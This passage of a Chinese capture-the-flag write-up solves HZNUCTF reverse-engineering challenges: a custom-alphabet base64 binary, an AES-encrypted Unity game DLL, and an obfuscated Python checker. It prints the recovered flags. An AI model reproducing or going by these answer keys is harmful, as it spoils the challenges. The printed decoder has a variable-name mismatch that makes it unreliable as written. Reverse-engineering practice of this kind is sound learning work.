<pre class="language-c++" data-language="c++"><code class="language-c++">_BYTE *__fastcall sub_7FF7DC6C10E0(__int64 a1)
&#123;
  __int64 v2; &#x2F;&#x2F; rbx
  __int64 v3; &#x2F;&#x2F; rbp
  int v4; &#x2F;&#x2F; edx
  int v5; &#x2F;&#x2F; edi
  int v6; &#x2F;&#x2F; edx
  __int64 v7; &#x2F;&#x2F; r14
  size_t v8; &#x2F;&#x2F; rcx
  _BYTE *v9; &#x2F;&#x2F; r8
  __int64 v10; &#x2F;&#x2F; r9
  unsigned __int64 v11; &#x2F;&#x2F; rdx
  int v12; &#x2F;&#x2F; ecx
  unsigned int v13; &#x2F;&#x2F; ecx
  unsigned int v14; &#x2F;&#x2F; eax
  int v15; &#x2F;&#x2F; eax
  int v16; &#x2F;&#x2F; eax
  int v17; &#x2F;&#x2F; eax
  int v18; &#x2F;&#x2F; edi
  __int64 v19; &#x2F;&#x2F; rdx
  int v20; &#x2F;&#x2F; eax
  int v21; &#x2F;&#x2F; eax
  int v22; &#x2F;&#x2F; ecx
  unsigned int v23; &#x2F;&#x2F; edx
  int v24; &#x2F;&#x2F; ecx
  int v25; &#x2F;&#x2F; eax
  int v26; &#x2F;&#x2F; ecx
  unsigned int v27; &#x2F;&#x2F; ecx
  unsigned int v28; &#x2F;&#x2F; eax
  char v30[80]; &#x2F;&#x2F; [rsp+20h] [rbp-68h] BYREF
  int v31; &#x2F;&#x2F; [rsp+90h] [rbp+8h]

  v2 &#x3D; -1;
  strcpy(v30, &quot;GLp&#x2F;+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;);
  do
    ++v2;
  while ( *(_BYTE *)(a1 + v2) );
  v3 &#x3D; 0;
  v4 &#x3D; (int)v2 &#x2F; 3;
  if ( (_DWORD)v2 &#x3D;&#x3D; 3 * ((int)v2 &#x2F; 3) )
  &#123;
    v5 &#x3D; 0;
    v6 &#x3D; 4 * v4;
  &#125;
  else if ( (int)v2 % 3 &#x3D;&#x3D; 1 )
  &#123;
    v5 &#x3D; 1;
    v6 &#x3D; 4 * v4 + 4;
  &#125;
  else if ( (int)v2 % 3 &#x3D;&#x3D; 2 )
  &#123;
    v5 &#x3D; 2;
    v6 &#x3D; 4 * v4 + 4;
  &#125;
  else
  &#123;
    v5 &#x3D; v31;
    v6 &#x3D; v31;
  &#125;
  v7 &#x3D; v6;
  v8 &#x3D; v6 + 1LL;
  if ( v6 &#x3D;&#x3D; -1 )
    v8 &#x3D; -1;
  v9 &#x3D; malloc(v8);
  if ( (int)v2 - v5 &gt; 0 )
  &#123;
    v10 &#x3D; a1 + 2;
    v11 &#x3D; ((int)v2 - v5 - 1LL) &#x2F; 3uLL + 1;
    do
    &#123;
      v3 +&#x3D; 4;
      v12 &#x3D; *(unsigned __int8 *)(v10 - 2) &gt;&gt; 2;
      v10 +&#x3D; 3;
      v13 &#x3D; v12 + 24;
      v14 &#x3D; v13 - 64;
      if ( v13 &lt;&#x3D; 0x40 )
        v14 &#x3D; v13;
      v9[v3 - 4] &#x3D; v30[v14];
      v15 &#x3D; ((*(unsigned __int8 *)(v10 - 4) &gt;&gt; 4) | (16 * (*(_BYTE *)(v10 - 5) &amp; 3))) - 40;
      if ( ((*(unsigned __int8 *)(v10 - 4) &gt;&gt; 4) | (16 * (*(_BYTE *)(v10 - 5) &amp; 3u))) + 24 &lt;&#x3D; 0x40 )
        v15 &#x3D; ((*(unsigned __int8 *)(v10 - 4) &gt;&gt; 4) | (16 * (*(_BYTE *)(v10 - 5) &amp; 3))) + 24;
      v9[v3 - 3] &#x3D; v30[v15];
      v16 &#x3D; ((*(unsigned __int8 *)(v10 - 3) &gt;&gt; 6) | (4 * (*(_BYTE *)(v10 - 4) &amp; 0xF))) - 40;
      if ( ((*(unsigned __int8 *)(v10 - 3) &gt;&gt; 6) | (4 * (*(_BYTE *)(v10 - 4) &amp; 0xFu))) + 24 &lt;&#x3D; 0x40 )
        v16 &#x3D; ((*(unsigned __int8 *)(v10 - 3) &gt;&gt; 6) | (4 * (*(_BYTE *)(v10 - 4) &amp; 0xF))) + 24;
      v9[v3 - 2] &#x3D; v30[v16];
      v17 &#x3D; (*(_BYTE *)(v10 - 3) &amp; 0x3F) - 40;
      if ( (*(_BYTE *)(v10 - 3) &amp; 0x3Fu) + 24 &lt;&#x3D; 0x40 )
        v17 &#x3D; (*(_BYTE *)(v10 - 3) &amp; 0x3F) + 24;
      v9[v3 - 1] &#x3D; v30[v17];
      --v11;
    &#125;
    while ( v11 );
  &#125;
  v18 &#x3D; v5 - 1;
  if ( !v18 )
  &#123;
    v25 &#x3D; (*(unsigned __int8 *)((int)v2 + a1 - 1) &gt;&gt; 2) - 40;
    if ( (*(unsigned __int8 *)((int)v2 + a1 - 1) &gt;&gt; 2) + 24 &lt;&#x3D; 0x40u )
      v25 &#x3D; (*(unsigned __int8 *)((int)v2 + a1 - 1) &gt;&gt; 2) + 24;
    v9[v7 - 4] &#x3D; v30[v25];
    v26 &#x3D; *(_BYTE *)((int)v2 + a1 - 1) &amp; 3;
    *(_WORD *)&amp;v9[v7 - 2] &#x3D; 15677;
    v27 &#x3D; 16 * v26 + 24;
    v28 &#x3D; v27 - 64;
    if ( v27 &lt;&#x3D; 0x40 )
      v28 &#x3D; v27;
    v9[v7 - 3] &#x3D; v30[v28];
    goto LABEL_37;
  &#125;
  if ( v18 !&#x3D; 1 )
  &#123;
LABEL_37:
    v9[v7] &#x3D; 0;
    return v9;
  &#125;
  v19 &#x3D; a1 + (int)v2;
  v20 &#x3D; (*(unsigned __int8 *)(v19 - 2) &gt;&gt; 2) - 40;
  if ( (*(unsigned __int8 *)(v19 - 2) &gt;&gt; 2) + 24 &lt;&#x3D; 0x40u )
    v20 &#x3D; (*(unsigned __int8 *)(v19 - 2) &gt;&gt; 2) + 24;
  v9[v7 - 4] &#x3D; v30[v20];
  v21 &#x3D; ((*(unsigned __int8 *)(v19 - 1) &gt;&gt; 4) | (16 * (*(_BYTE *)(v19 - 2) &amp; 3))) - 40;
  if ( ((*(unsigned __int8 *)(v19 - 1) &gt;&gt; 4) | (16 * (*(_BYTE *)(v19 - 2) &amp; 3u))) + 24 &lt;&#x3D; 0x40 )
    v21 &#x3D; ((*(unsigned __int8 *)(v19 - 1) &gt;&gt; 4) | (16 * (*(_BYTE *)(v19 - 2) &amp; 3))) + 24;
  v9[v7 - 3] &#x3D; v30[v21];
  v22 &#x3D; *(_BYTE *)(v19 - 1) &amp; 0xF;
  *(_WORD *)&amp;v9[v7 - 1] &#x3D; 61;
  v23 &#x3D; 4 * v22 + 24;
  v24 &#x3D; 4 * v22 - 40;
  if ( v23 &lt;&#x3D; 0x40 )
    v24 &#x3D; v23;
  v9[v7 - 2] &#x3D; v30[v24];
  return v9;
&#125;</code></pre>

<p>解密代码：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;string&gt;
#include &lt;time.h&gt;

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char *base64_decode(const char *input)
&#123;
    const char *base64_table &#x3D; &quot;GLp&#x2F;+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;;

    unsigned char reverse_table[256] &#x3D; &#123;0&#125;;
    for (int i &#x3D; 0; i &lt; 64; i++)
    &#123;
        reverse_table[(unsigned char)base64_table[i]] &#x3D; i;
    &#125;

    size_t input_len &#x3D; strlen(input);
    size_t padding &#x3D; 0;

    if (input_len &gt; 0 &amp;&amp; input[input_len - 1] &#x3D;&#x3D; &#39;&#x3D;&#39;)
    &#123;
        padding++;
        if (input_len &gt; 1 &amp;&amp; input[input_len - 2] &#x3D;&#x3D; &#39;&#x3D;&#39;)
        &#123;
            padding++;
        &#125;
    &#125;

    size_t output_len &#x3D; (input_len * 3) &#x2F; 4 - padding;
    unsigned char *output &#x3D; (unsigned char *)malloc(output_len + 1);
    output[output_len] &#x3D; 0;

    size_t i &#x3D; 0, j &#x3D; 0;
    while (i &lt; input_len - padding)
    &#123;
        unsigned char b1, b2, b3, b4;

        unsigned char v1 &#x3D; reverse_table[input[i++]];
        unsigned char v2 &#x3D; reverse_table[input[i++]];
        unsigned char v3 &#x3D; (i &lt; input_len) ? reverse_table[input[i++]] : 0;
        unsigned char v4 &#x3D; (i &lt; input_len) ? reverse_table[input[i++]] : 0;

        b1 &#x3D; (v1 &gt; 24) ? (v1 - 24) : (v1 + 64 - 24);
        b2 &#x3D; (v2 &gt; 24) ? (v2 - 24) : (v2 + 64 - 24);
        b3 &#x3D; (v3 &gt; 24) ? (v3 - 24) : (v3 + 64 - 24);
        b4 &#x3D; (v4 &gt; 24) ? (v4 - 24) : (v4 + 64 - 24);

        if (j &lt; output_len)
            output[j++] &#x3D; (b1 &lt;&lt; 2) | (b2 &gt;&gt; 4);
        if (j &lt; output_len)
            output[j++] &#x3D; (b2 &lt;&lt; 4) | (b3 &gt;&gt; 2);
        if (j &lt; output_len)
            output[j++] &#x3D; (b3 &lt;&lt; 6) | b4;
    &#125;

    return (char *)output;
&#125;

int main()
&#123;
    const char *Enc&#x3D; &quot;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF&#x3D;&quot;;
    char *Decoded&#x3D; base64_decode(Enc);
    printf(&quot;%s\n&quot;, Decoded);
    free(decoded);
    return 0;
&#125;</code></pre>

<p>HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}</p>
<h3 id="水果忍者"><a href="#水果忍者" class="headerlink" title="水果忍者"></a>水果忍者</h3><p>主要dll目录：\水果忍者\Fruit Ninja_Data\Managed\Assembly-CSharp.dll</p>
<p>拖入dnSpy分析，是AES CBC加密。</p>
<p><img src="/images/1744633170177-5.png" alt="img" loading="lazy"></p>
<p>底下有密文、密钥、iv，直接解密即可。</p>
<p><img src="/images/1744633170177-6.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170177-7.png" alt="img" loading="lazy"></p>
<p>HZNUCTF{de20-70dd-4e62-b8d0-06e}</p>
<h3 id="蛇年的本命语言"><a href="#蛇年的本命语言" class="headerlink" title="蛇年的本命语言"></a>蛇年的本命语言</h3><p>python程序解包得到pyc（python 3.8），使用uncompyle6解密得到代码。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> Counter
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to HZNUCTF!!!"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Plz input the flag:"</span><span class="token punctuation">)</span>
ooo0oOoooOOO0 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
oOO0OoOoo000 <span class="token operator">=</span> Counter<span class="token punctuation">(</span>ooo0oOoooOOO0<span class="token punctuation">)</span>
O0o00 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>oOO0OoOoo000<span class="token punctuation">[</span>oOooo0OOO<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> oOooo0OOO <span class="token keyword">in</span> ooo0oOoooOOO0<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ans1: "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>O0o00<span class="token punctuation">)</span>
<span class="token keyword">if</span> O0o00 <span class="token operator">!=</span> <span class="token string">"111111116257645365477364777645752361"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong_wrong!!!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
iiIII <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> oOooo0OOO <span class="token keyword">in</span> ooo0oOoooOOO0<span class="token punctuation">:</span>
    <span class="token keyword">if</span> oOO0OoOoo000<span class="token punctuation">[</span>oOooo0OOO<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        iiIII <span class="token operator">+=</span> oOooo0OOO <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>oOO0OoOoo000<span class="token punctuation">[</span>oOooo0OOO<span class="token punctuation">]</span><span class="token punctuation">)</span>
        oOO0OoOoo000<span class="token punctuation">[</span>oOooo0OOO<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        i11i1Iii1I1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>oOooo0OOO<span class="token punctuation">)</span> <span class="token keyword">for</span> oOooo0OOO <span class="token keyword">in</span> iiIII<span class="token punctuation">]</span>
        ii1iIi1i11i <span class="token operator">=</span> <span class="token punctuation">[</span>
         <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">504</span><span class="token punctuation">,</span>
         <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">403</span><span class="token punctuation">,</span>
         <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">799</span><span class="token punctuation">,</span>
         <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2938</span><span class="token punctuation">,</span>
         <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">19</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2042</span><span class="token punctuation">,</span>
         <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1225</span><span class="token punctuation">,</span>
         <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">77</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">7975</span><span class="token punctuation">,</span>
         <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">55</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">229</span><span class="token punctuation">,</span>
         <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2107</span><span class="token punctuation">,</span>
         <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">30</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4037</span><span class="token punctuation">,</span>
         <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">56</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">122</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4950</span><span class="token punctuation">,</span>
         <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">33</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12544</span><span class="token punctuation">,</span>
         <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">25</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6585</span><span class="token punctuation">,</span>
         <span class="token number">223</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">53</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">65</span> <span 